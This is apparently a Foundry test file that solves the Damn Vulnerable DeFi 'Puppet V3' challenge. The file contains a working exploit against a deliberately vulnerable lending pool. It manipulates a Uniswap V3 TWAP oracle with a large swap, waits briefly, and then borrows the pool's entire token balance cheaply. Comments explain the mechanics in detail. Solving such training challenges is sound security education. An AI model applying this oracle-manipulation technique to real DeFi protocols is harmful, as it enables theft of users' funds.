// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

pragma abicoder v2;

import "forge-std/Test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import "../../../src/Contracts/DamnValuableToken-7.6.sol";
import "../../../src/Contracts/puppet-v3/PuppetV3Pool.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {INonfungiblePositionManager }from "./INonfungiblePositionManager.sol";
import {WETH9} from "../../../src/Contracts/WETH9-7.0.sol";
import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import {UniswapV3Factory} from "@uniswap/v3-core/contracts/UniswapV3Factory.sol";
import {UniswapV3Pool} from "@uniswap/v3-core/contracts/UniswapV3Pool.sol";
import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";

contract PuppetV3 is Test {

    // Uniswap exchange will start with 100 DVT and 100 WETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;

    // Player will start with 110 DVT and 1 ETH
    uint256 internal constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 internal constant PLAYER_INITIAL_ETH_BALANCE = 1 ether;

    uint256 internal constant DEPLOYER_INITIAL_ETH_BALANCE = 200 ether;

    // Pool will start with 1,000,000 DVT
    uint256 internal constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    // SET RPC URL HERE // --fork-url $ETH_RPC_URL
    string MAINNET_FORKING_URL = vm.envString("MAINNET_FORKING_URL");

    UniswapV3Pool internal uniswapV3Pool;
    UniswapV3Factory internal uniswapV3Factory;
    INonfungiblePositionManager internal uniswapPositionManager;

    DamnValuableToken internal dvt;
    WETH9 internal weth;
    PuppetV3Pool internal puppetV3Pool;
    Utilities internal utils;
    address payable internal player;
    address payable internal deployer;
    uint256 internal initialBlockTimestamp;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        vm.createSelectFork(MAINNET_FORKING_URL, 15450164);

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        deployer = users[0];
        vm.label(deployer, "deployer");
        vm.deal(deployer, DEPLOYER_INITIAL_ETH_BALANCE);
        assertEq(deployer.balance , DEPLOYER_INITIAL_ETH_BALANCE);

        player = users[1];
        vm.label(player, "player");
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance , PLAYER_INITIAL_ETH_BALANCE);

        vm.startPrank(deployer);
        // Get a reference to the Uniswap V3 Factory contract
        uniswapV3Factory = UniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
        vm.label(address(uniswapV3Factory), "Uniswap V3 Factory");

        // Get a reference to WETH9
        weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        vm.label(address(weth), "WETH");

        // Deployer wraps ETH in WETH
        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();
        assertEq(weth.balanceOf(deployer), UNISWAP_INITIAL_WETH_LIQUIDITY);

        // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Create the Uniswap v3 pool
        uniswapPositionManager = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
        uint24 FEE = 3000; // 0.3%
        uniswapPositionManager.createAndInitializePoolIfNecessary{ gas: 5000000 }(
            address(weth) < address(dvt) ? address(weth) : address(dvt),  // token0
            address(weth) < address(dvt) ? address(dvt) : address(weth), // token1
            FEE,
            uint160(2**96)
        );

        address uniswapPoolAddress = uniswapV3Factory.getPool(
            address(weth),
            address(dvt),
            FEE
        );

        uniswapV3Pool = UniswapV3Pool(uniswapPoolAddress);
        uniswapV3Pool.increaseObservationCardinalityNext(40);

        // Deployer adds liquidity at current price to Uniswap V3 exchange
        dvt.approve(address(uniswapPositionManager), type(uint256).max);
        weth.approve(address(uniswapPositionManager), type(uint256).max);
        // vm.warp(block.timestamp + 1);
        uniswapPositionManager.mint{gas: 5000000}(INonfungiblePositionManager.MintParams({
            token0: address(weth) < address(dvt) ? address(weth) : address(dvt), // token0 
            token1: address(weth) < address(dvt) ? address(dvt) : address(weth),  // token1 
            tickLower: -60, // tickLower
            tickUpper: 60, // tickUpper
            fee: FEE, // fee
            recipient: deployer, // recipient
            amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY, // amount0Desired
            amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY, // amount1Desired
            amount0Min: 0, // amount0Min
            amount1Min: 0, // amount1Min
            deadline: block.timestamp * 2 // deadline
        }));
        


        // Deploy the lending pool
        puppetV3Pool = new PuppetV3Pool(IERC20Minimal(address(weth)), IERC20Minimal(address(dvt)), uniswapV3Pool);

        // Setup initial token balances of pool and player
        dvt.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetV3Pool), LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // Some time passes
        vm.warp(block.timestamp + 3 days);

        vm.stopPrank();

        // Ensure oracle in lending pool is working as expected. At this point, DVT/WETH price should be 1:1.
        // To borrow 1 DVT, must deposit 3 WETH
        assertEq(puppetV3Pool.calculateDepositOfWETHRequired(1 ether), 3 ether);

        // To borrow all DVT in lending pool, user must deposit three times its value
        assertEq(puppetV3Pool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE), LENDING_POOL_INITIAL_TOKEN_BALANCE * 3);

        // Ensure player doesn't have that much ETH
        assertLt(player.balance, LENDING_POOL_INITIAL_TOKEN_BALANCE * 3);

        initialBlockTimestamp = block.timestamp;
    }

    function testExploit() public {
        /** EXPLOIT START */
        vm.startPrank(player);

        // @note For a DETAILED math and protocol explanation check the Uniswap V3 developement book at https://uniswapv3book.com/print.html
        // The idea is to massively deflate the price of dvt by swapping all the WETH from the pool. To do that, we will have to swap every single weth from the pool. Here is the thing though, withing the same block (timestamp), the price is not updated. In real life, this would make oracle manipulation attacks very difficult to achieve as at the beginning of the next block, arbitrageurs can fill the gap in case of a drastic price change. Plus it would be very expensive to achieve this. By carrying out the swap of 110 DVT tokens into WETh we are able to complety deplete the reserve of WETH in the Pool. 
        // @note This behavior is only possible in V3 and not V2 or V1. Here is why :
        // Uniswap V2 : Suppose an LP provides liquidity with 10 ETH and 20,000 USDC. Regardless of the price, the liquidity is spread uniformly across all possible price ranges. For simplicity, if the price moves from 2000 USDC/ETH to 2200 USDC/ETH, both ETH and USDC reserves will adjust to maintain the constant product (x * y = k). Both reserves will always be > 0.
        // Uniswap V3 : Suppose an LP wants to provide liquidity within the price range of 2000 USDC/ETH to 2200 USDC/ETH.
        // The formula to calculate liquidity within a specific price range in Uniswap V3 takes into account that one of the tokens can be fully depleted as the price moves to the boundaries. As the price reaches the lower bound (2000 USDC/ETH), the ETH could be fully utilized. As the price reaches the upper bound (2200 USDC/ETH), the USDC could be fully utilized.

        // When a user provides liquidity for a price range, the liquidity(L) is calculated based on four parameters: the desired upper and lower price ( sqrtRatioAX96 sqrtRatioBX96), and the desired deposit amount for each token(amount0,amount1). When deriving the liquidity(L), V3 by design assumes amount0 or amount1 is reduced to zero when sqrtRatioAX96 or sqrtRatioBX96 is reached. This is not true in V2 or V1, where amount0 or amount1 is only partially reduced to reach a given upper or lower price.
        // Also We know in V2 and V1, amount0 or amount1 will always be greater than x real or y real , otherwise, we deplete the reserve of either token when Pb or Pc is reached. But in V3 if we look at LiquidityAmounts.sol, amount0 oramount1 directly becomes x real ory real

        // Now for the swap : When we swap all the weth out, the TWAP will not change. Uniswap V3 uses a concept of observations. Observations are made whenever a swap is made which changes the tick price of a pool. However observations are made BEFORE the new swap price is calculated. In these observations we store the tickCumulative values, which is the sum of ticks at each second the history of a pool contract. The accumulated tick is calculated by
        // tickCumulative = lastObservation.tickCumulative  + (currentTick * deltaTimeSinceLastObservation)
        // When a pool is initialized the first observation will have a tickCumulative of 0 since no time has passed.
        // When a swap happens and say the new tick of the pool becomes 25 and it has been 10 seconds since the last observation. Then the latest observation will have a tickCumulative of:
        // 0 + (0 * 10) = 0. This is because it is taking the price that was calculated BEFORE the swap happened.
        // Then another swap happens and the new tick price is 75 and it has been 100 seconds since the last observation. Then the latest observation will have a tickCumulative of:
        // 0 + (25 * 100) = 250
        // This can be seen in the code :
        // UniswapV3Pool.sol function swap() line 733 to 750:
        // update tick and write an oracle entry if the tick change
        // if (state.tick != slot0Start.tick) {
        //     (uint16 observationIndex, uint16 observationCardinality) =
        //         observations.write(
        //             slot0Start.observationIndex,
        //             cache.blockTimestamp,
        //             slot0Start.tick,
        //             cache.liquidityStart,
        //             slot0Start.observationCardinality,
        //             slot0Start.observationCardinalityNext
        //         );
        //     (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (
        //         state.sqrtPriceX96,
        //         state.tick,
        //         observationIndex,
        //         observationCardinality
        //     );
        // @note In other words, it immediately recalculate a new observation for the current block using the old tick (slot0Start.tick), then it updates with the new tick state.tick. Initially slot0Start.tick is 0 so when PuppetV3Pool calls OracleLibrary.consult() it will make a series of calls until you enter the contract Oracle.sol function observe single. If you make this call immediately after the swap, it will just return the latest obbservation that was written during the swap which uses the older slot0.tick 
        //         if (secondsAgo == 0) {
        //     Observation memory last = self[index];
        //     if (last.blockTimestamp != time) last = transform(last, time, tick, liquidity);
        //     return (last.tickCumulative, last.secondsPerLiquidityCumulativeX128);
        // } 
        // @note By waiting a little bit after the swap, the function will enter the transform() : tickCumulative: last.tickCumulative + int56(tick) * delta and will use the new slot0.tick that was calculated during the swap and delta will be positive. The more we wait the more arithmeticMeanTick value is going to be bigger in absolute value. More details : https://samcalamos.me/posts/dvdf/puppet-v3/
        weth.deposit{value : player.balance}();
        FlashSwap flashSwap = new FlashSwap(uniswapV3Pool, puppetV3Pool, dvt, weth);
        weth.transfer(address(flashSwap), weth.balanceOf(player) );
        dvt.transfer(address(flashSwap), dvt.balanceOf(player));


        bool zeroForOne = address(weth) < address(dvt) ? false : true;
        uint160  MIN_SQRT_RATIO = 4295128739;
        uint160  MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;
        uint160 sqrtPriceLimitX96 = zeroForOne
            ? MIN_SQRT_RATIO + 1
            : MAX_SQRT_RATIO - 1;
        // We execute the swap
        flashSwap.flashSwap(zeroForOne, int256(PLAYER_INITIAL_TOKEN_BALANCE), sqrtPriceLimitX96);

        // We wait for 100 seconds
        skip(100);
        // We now call borrow. 
        // @note Notice that the tick value after the swap is 887271 which is out of range. Notice in the setup of the challenge, the deployer provided liquidity within the tick range of -60 to 60. 
        // This is because Uniswap was searching for an initialized tick outside of -60 to 60 range but couldn’t find one, instead, it returned the tick for the limit price TickMath.MAX_SQRT_RATIO-1 we input in swap function. UniswapV3 allows the tick range to be crossed. What happened under the hood is that in swap function, the pool goes through a while loop to iterate on swapping between initialized ticks. And the condition to exit the loop is either all DVT tokens we supplied have been swapped or the limit price sqrtPriceLimitX96 we set is reached. The sqrtPriceLimitX96 we gave is the max Ratio so it natural that max tick would be returned then. More details : https://systemweakness.com/damn-vulnerable-defi-v3-14-puppet-v3-solution-2bfb9f060c4a
        flashSwap.borrow();

        vm.stopPrank();
        /** EXPLOIT END */

        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Block timestamp must not have changed too much
        assertLt(
            block.timestamp - initialBlockTimestamp
         , 115, 'Too much time passed');

        // Player has taken all tokens from the pool
        assertGe(dvt.balanceOf(player), LENDING_POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetV3Pool)), 0);
    }
}



contract FlashSwap is IUniswapV3SwapCallback{
    UniswapV3Pool internal uniswapV3Pool;
    PuppetV3Pool internal puppetV3Pool;
    DamnValuableToken internal dvt;
    WETH9 internal weth;
    address internal player;

    constructor(UniswapV3Pool _uniswapV3Pool, PuppetV3Pool _puppetV3Pool, DamnValuableToken _dvt, WETH9 _weth){
        player = msg.sender;
        uniswapV3Pool = _uniswapV3Pool;
        puppetV3Pool = _puppetV3Pool;
        dvt = _dvt;
        weth = _weth;
    }

    function flashSwap(
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96) external {
        uniswapV3Pool.swap(address(this),
            zeroForOne,
            amountSpecified,
            sqrtPriceLimitX96,
            abi.encode(zeroForOne));

    }
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 ,
        bytes calldata
    ) external override {

        dvt.transfer(address(uniswapV3Pool), uint256(amount0Delta));
    }

    function borrow() external {
        puppetV3Pool.calculateDepositOfWETHRequired(dvt.balanceOf(address(puppetV3Pool)));
        weth.approve(address(puppetV3Pool), type(uint256).max);
        puppetV3Pool.borrow(dvt.balanceOf(address(puppetV3Pool)));

        weth.transfer(player, weth.balanceOf(address(this)));
        dvt.transfer(player, dvt.balanceOf(address(this)));
    }
}